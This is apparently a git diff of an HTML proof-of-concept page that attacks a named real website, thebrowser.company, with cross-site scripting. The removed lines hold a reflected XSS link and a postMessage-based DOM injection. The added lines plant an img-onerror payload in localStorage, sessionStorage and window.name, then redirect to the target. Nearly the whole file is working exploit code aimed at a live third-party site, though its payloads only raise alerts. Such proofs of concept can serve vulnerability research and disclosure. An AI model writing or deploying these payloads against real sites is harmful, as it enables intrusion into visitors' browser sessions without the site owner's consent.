@@ -2,39 +2,32 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>XSS Exploit PoC – thebrowser.company</title>
-  <style>
-    body { background: #111; color: #0f0; font-family: monospace; padding: 2rem; }
-    code { color: #0ff; }
-  </style>
+  <title>Unified XSS PoC</title>
 </head>
 <body>
-  <h1>🚨 XSS Exploit PoC</h1>
-  <p>This page demonstrates a working XSS vulnerability on <code>thebrowser.company</code>.</p>
-
-  <h2>🔗 Reflected XSS via URL:</h2>
-  <p>
-    <a href="https://thebrowser.company/?xss=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E" target="_blank">
-      Click here to open vulnerable URL
-    </a>
-  </p>
-
-  <h2>📤 DOM XSS via postMessage</h2>
-  <p>This will auto-send a payload using <code>postMessage</code> API after 1 second.</p>
-
+  <h2>⏳ Preparing XSS Payload...</h2>
   <script>
-    setTimeout(() => {
-      const payload = `<img src=x onerror=alert('XSS_DOM_POC')>`;
-      window.open("https://thebrowser.company", "_blank");
-      setTimeout(() => {
-        const popup = window.open("", "_blank");
-        if (popup) {
-          popup.postMessage({ data: payload }, "*");
-        } else {
-          alert("❌ Failed to open popup window for injection");
-        }
-      }, 1500);
-    }, 1000);
+    const payload = `<img src=x onerror=alert('🔥 Remote XSS Executed!')>`;
+
+    // Inject into localStorage
+    localStorage.setItem("xss_payload", payload);
+    localStorage.setItem("xss_test", payload);
+
+    // Inject into sessionStorage
+    sessionStorage.setItem("xss_payload", payload);
+    sessionStorage.setItem("xss_test", payload);
+
+    // Inject into window.name
+    window.name = payload;
+
+    // Optional: display what we're doing
+    console.log("📦 Payload written to:");
+    console.log("- localStorage");
+    console.log("- sessionStorage");
+    console.log("- window.name");
+
+    // Redirect to target site
+    location.href = "https://thebrowser.company/";
   </script>
 </body>
 </html>
